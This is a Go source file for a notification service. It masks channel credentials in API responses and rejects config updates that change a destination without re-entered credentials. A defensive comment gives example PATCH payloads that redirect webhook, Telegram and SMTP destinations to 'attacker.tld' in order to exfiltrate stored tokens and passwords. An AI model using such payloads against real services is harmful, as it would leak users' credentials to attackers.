package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix marks masked values. API responses replace credentials with values carrying this prefix;
// update requests interpret such values as keeping the stored value unchanged.
//
// A prefix, rather than an empty string or fixed constant, also allows some identifying information
// (see MaskedValue), letting users recognize the bot without repasting its key.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"              Original too short; provide no hint.
//	"__masked__:…ab12cd"      Include the last 6 characters as an identifying hint.
//
// Exposing only the final 6 characters is deliberate: Webhook identifiers occur near the end (WeCom key,
// Feishu bot id), whereas prefixes are shared and unhelpful. Six characters cannot reconstruct
// the credential but suffice for the configurator to recognize the group.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is masked (returned by the API and left unchanged).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig copies configuration, replacing channel credential fields with masked values.
//
// Unknown channel types return an empty map, not the original configuration; prefer an unavailable configuration UI
// o exposing raw content that may contain credentials when the channel type is unrecognized.
// Preserve noncredential fields unchanged so the UI can display them.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Treat nested structures such as headers as one credential: inspecting subkeys would require each channel
		// to declare another set of credential-subkey rules, with complexity exceeding the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means the destination changed without explicit input for
// credential fields. Return it rather than silently allowing the change or dropping credentials; see PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // Changed destination keys
	Missing []string // Credential keys not explicitly supplied
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "Destination fields (" + strings.Join(e.Changed, ", ") + ") changed; re-enter credential fields (" +
		strings.Join(e.Missing, ", ") + "): provide a new value, or explicitly leave empty if credentials are no longer needed. " +
		"The original credentials were authorized only for the old destination; reusing them would disclose them to the new destination."
}

// PrepareConfigUpdate merges channel configuration and handles security-sensitive destination changes.
//
// It replaces bare MergeConfig in channel updates to block this verified attack path:
// destination and credentials are independent fields, while MergeConfig preserves stored values
// for omitted keys. Anyone able to PATCH a channel could **change only the destination,
// omitting credentials**, causing the server to send stored credentials to an attacker-controlled endpoint:
//
//	webhook  {config:{url:"https://attacker.tld"}}  -> original Authorization header sent externally
//	telegram {config:{base_url:"https://attacker.tld"}} -> /bot<真Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    -> username and password sent after STARTTLS
//
// This is entirely silent and needs no redirect, so denying cross-host redirects does not stop it;
// it directly defeats masking's goal of never returning credentials to the browser.
//
// Rule: whenever a destination key changes, callers must explicitly address **every** credential key:
//   - Supply a new value -> use it.
//   - Explicitly supply an empty string -> no credential needed for this field (preserve clearing semantics).
//   - Return the masked value unchanged or omit the key -> reject.
//
// The third case is rejected because a masked value means reusing the old credential, which
// belongs only to the old destination. Deliberately do not automatically discard credentials: optional fields
// (webhook headers, email password) would silently lose authentication while returning 200,
// making diagnosis harder than an error. Prefer requiring explicit re-entry.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("Channel kind %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// A masked literal inside a nonstring credential value (such as a webhook headers object)
	// means the caller embedded a keep-original sentinel inside a structure. MergeConfig recognizes only strings
	// with the prefix as masked; this would be stored as an ordinary object, persisting literal
	// "__masked__" and silently breaking subsequent authentication. Reject it instead.
	//
	// This check must come **first**: an unchanged destination returns early, so placing it later
	// covers only destination changes (the initial version made this mistake, caught by tests).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find genuinely changed destination keys. Masked values mean unchanged.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Unchanged destination: normal merge (masked preserves, empty clears, otherwise overwrite).
		return MergeConfig(stored, incoming), nil
	}

	// Changed destination: require explicit input for every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects masked sentinels embedded in nonstring structures.
//
// Masking assumes the **entire value is a string**. Object fields such as webhook headers
// must be masked as a whole (the string "__masked__") or submitted as a whole; embedded sentinels
// cannot express keeping values unchanged and would be stored as real values.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("Field %s contains mask marker %q: leave the entire field empty to retain its value, or submit a complete new value; embedded mask placeholders are not allowed",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares configuration values for equivalence. JSON serialization also handles
// type differences: frontend ports are numbers and stored ports are float64; direct == could misclassify them.
//
// Normalize blank values first: an empty string and a missing key represent the same state here,
// because MergeConfig explicitly clears an empty string by deleting its key. Without normalization, an
// optional destination field left blank (Telegram base_url is the only one; blank uses the
// official URL) follows this sequence:
//
//	Creation stores base_url:"" -> first save removes the key through MergeConfig.
//	-> Second save: incoming is "", stored lacks the key; classified as a destination change.
//	-> Credentials are masked -> 400 requiring credentials to be re-entered with the changed destination.
//
// Every subsequent save fails unless the user repastes the Bot Token, despite changing nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue reports whether a configuration value is blank.
// Its definition must match MergeConfig's clearing check (strings.TrimSpace(s) == ""),
// or MergeConfig may consider a value removable while sameConfigValue considers it present.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming over stored to update channel configuration.
//
// Rules:
//   - Masked incoming value -> preserve stored value (the user did not edit this field).
//   - Empty incoming string -> explicit clearing; delete the key.
//   - Other keys -> overwrite with incoming values.
//   - Keys present only in stored -> preserve (partial-update semantics).
//
// Whether an empty string clears must be explicit: frontend forms submit blank fields as empty strings;
// storing those as real values would clear fields intended to retain their existing values.
// Choose explicit clearing because users have no other way to remove a misconfigured field
// (omitting a field distinguishes absent from explicitly empty, but the UI does not use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // Masked value means unchanged; retain stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
